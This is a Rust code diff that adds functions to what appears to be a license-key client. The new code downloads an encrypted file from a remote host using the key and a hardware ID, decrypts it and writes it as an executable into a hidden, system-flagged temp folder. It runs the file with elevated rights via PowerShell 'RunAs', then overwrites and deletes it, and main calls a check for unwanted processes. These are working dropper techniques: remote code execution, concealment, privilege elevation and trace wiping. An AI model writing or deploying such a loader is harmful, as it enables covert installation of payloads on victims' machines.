@@ -234,6 +234,136 @@ fn start_session_validation(key: String, token_store: Arc<Mutex<TokenStore>>) {
     });
 }
 
+fn recv_exact(tls_stream: &mut native_tls::TlsStream<TcpStream>, n: usize) -> Option<Vec<u8>> {
+    let mut buf = vec![0u8; n];
+    let mut offset = 0;
+    while offset < n {
+        match tls_stream.read(&mut buf[offset..]) {
+            Ok(0) => return None,
+            Ok(r) => offset += r,
+            Err(_) => return None,
+        }
+    }
+    Some(buf)
+}
+
+fn download_file(key: &str, file_name: &str, token_store: &Arc<Mutex<TokenStore>>) -> Option<Vec<u8>> {
+    let h = host();
+    let tcp_stream = TcpStream::connect((&*h, PORT)).ok()?;
+    tcp_stream.set_read_timeout(Some(Duration::from_secs(30))).ok()?;
+    tcp_stream.set_write_timeout(Some(Duration::from_secs(30))).ok()?;
+    let connector = TlsConnector::new().ok()?;
+    let mut tls_stream = connector.connect(&h, tcp_stream).ok()?;
+
+    tls_stream.write_all(b"6").ok()?;
+    thread::sleep(Duration::from_millis(100));
+    let req_data = format!("{}|{}|{}|{}", PROJECT_ID, key, get_hwid(), file_name);
+    tls_stream.write_all(req_data.as_bytes()).ok()?;
+
+    let hdr_len_raw = recv_exact(&mut tls_stream, 4)?;
+    let hdr_len = ((hdr_len_raw[0] as u32) << 24 | (hdr_len_raw[1] as u32) << 16 | (hdr_len_raw[2] as u32) << 8 | hdr_len_raw[3] as u32) as usize;
+    if hdr_len > 4096 { return None; }
+    let hdr_bytes = recv_exact(&mut tls_stream, hdr_len)?;
+    let header = String::from_utf8_lossy(&hdr_bytes).to_string();
+    if header.starts_with("ERROR") { return None; }
+
+    let parts: Vec<&str> = header.split('|').collect();
+    if parts.len() < 5 || parts[0] != "FILE" { return None; }
+    let nonce_hex = parts[1];
+    let tag_hex = parts[2];
+    let expected_hash = parts[3];
+    let file_size: usize = parts[4].parse().ok()?;
+
+    let body_len_raw = recv_exact(&mut tls_stream, 4)?;
+    let body_len = ((body_len_raw[0] as u32) << 24 | (body_len_raw[1] as u32) << 16 | (body_len_raw[2] as u32) << 8 | body_len_raw[3] as u32) as usize;
+    if body_len > 60 * 1024 * 1024 { return None; }
+    let body = recv_exact(&mut tls_stream, body_len)?;
+
+    let nonce = hex::decode(nonce_hex).ok()?;
+    let tag = hex::decode(tag_hex).ok()?;
+    if nonce.len() != 12 || tag.len() != 16 { return None; }
+
+    let mut file_key_mac = HmacSha256::new_from_slice(key.as_bytes()).ok()?;
+    file_key_mac.update(format!("FILE_KEY:{}", nonce_hex).as_bytes());
+    let file_key = file_key_mac.finalize().into_bytes();
+
+    use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
+    use aes_gcm::aead::generic_array::GenericArray;
+    let cipher = Aes256Gcm::new(GenericArray::from_slice(&file_key));
+    let nonce_arr = GenericArray::from_slice(&nonce);
+    let mut ciphertext = body;
+    ciphertext.extend_from_slice(&tag);
+
+    use aes_gcm::aead::Payload;
+    let plaintext = cipher.decrypt(nonce_arr, Payload { msg: &ciphertext, aad: PROJECT_ID.as_bytes() }).ok()?;
+
+    use sha2::Digest;
+    let hash = sha2::Sha256::digest(&plaintext);
+    let actual_hash = hex::encode(hash);
+    if actual_hash != expected_hash || plaintext.len() != file_size { return None; }
+    Some(plaintext)
+}
+
+fn secure_wipe(path: &str) {
+    if let Ok(metadata) = std::fs::metadata(path) {
+        let size = metadata.len() as usize;
+        if let Ok(mut f) = std::fs::OpenOptions::new().write(true).open(path) {
+            let zeros = vec![0u8; size];
+            let _ = f.write_all(&zeros);
+            let _ = f.flush();
+        }
+    }
+    let _ = std::fs::remove_file(path);
+}
+
+fn download_and_run(key: &str, file_name: &str, token_store: &Arc<Mutex<TokenStore>>) -> bool {
+    let data = match download_file(key, file_name, token_store) {
+        Some(d) => d,
+        None => return false,
+    };
+
+    let temp_dir = std::env::temp_dir();
+    let random_suffix = format!("{:08x}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().subsec_nanos());
+    let random_dir = temp_dir.join(format!("_ka_{}", random_suffix));
+    let _ = std::fs::create_dir_all(&random_dir);
+
+    if cfg!(target_os = "windows") {
+        let _ = Command::new("attrib").args(&["+h", "+s", random_dir.to_str().unwrap_or("")]).output();
+    }
+
+    let exe_path = random_dir.join(file_name);
+    if std::fs::write(&exe_path, &data).is_err() { return false; }
+
+    if cfg!(target_os = "windows") {
+        let _ = Command::new("attrib").args(&["+h", exe_path.to_str().unwrap_or("")]).output();
+    }
+
+    drop(data);
+
+    if cfg!(target_os = "windows") {
+        let _ = Command::new("powershell")
+            .args(&["-NoProfile", "-Command",
+                &format!("Start-Process -FilePath '{}' -WorkingDirectory '{}' -Verb RunAs",
+                    exe_path.to_str().unwrap_or(""), random_dir.to_str().unwrap_or(""))])
+            .spawn();
+    } else {
+        let _ = Command::new(exe_path.to_str().unwrap_or(""))
+            .current_dir(&random_dir)
+            .spawn();
+    }
+
+    let cap_exe = exe_path.to_str().unwrap_or("").to_string();
+    let cap_dir = random_dir.to_str().unwrap_or("").to_string();
+    thread::spawn(move || {
+        thread::sleep(Duration::from_secs(2));
+        secure_wipe(&cap_exe);
+        thread::sleep(Duration::from_secs(1));
+        let _ = std::fs::remove_dir_all(&cap_dir);
+    });
+
+    true
+}
+
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     check_bad_processes();
 
